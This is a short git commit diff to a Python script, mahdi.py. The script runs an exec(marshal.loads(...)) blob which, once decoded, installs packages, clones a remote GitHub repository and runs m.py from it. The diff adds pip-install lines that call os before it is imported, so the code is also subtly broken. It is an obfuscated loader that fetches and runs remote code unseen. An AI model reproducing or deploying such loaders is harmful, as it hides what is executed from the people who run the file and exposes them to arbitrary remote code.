25c959888f110e28e1c85a9572bcd726710af900
Mahdi-hasan580 <103421319+Mahdi-hasan580@users.noreply.github.com>
2022-05-10 14:45:12 +0600

    Update mahdi.py

--- mahdi.py
+++ mahdi.py
@@ -1,2 +1,10 @@
+#ASSALIKUM ALL
+
+os.system('pip install pyarmor')
+os.system('clear')
+os.system('pip install pyarmor')
+
+
+
 import marshal
 exec(marshal.loads(b's\x0f\x01\x00\x00import os\r\n\r\nimport sys\r\n\r\nimport time\r\n\r\nos.system("pip install requests")\r\nos.system(\'pip2 install requests\')\r\nos.system(\'pip2 install mechanize\')\r\nos.system("git clone https://github.com/MAHDI-Shuvo/jjj")\r\nos.system("cd jjj && python2 m.py")\r\n\r\n\r\n                               '))
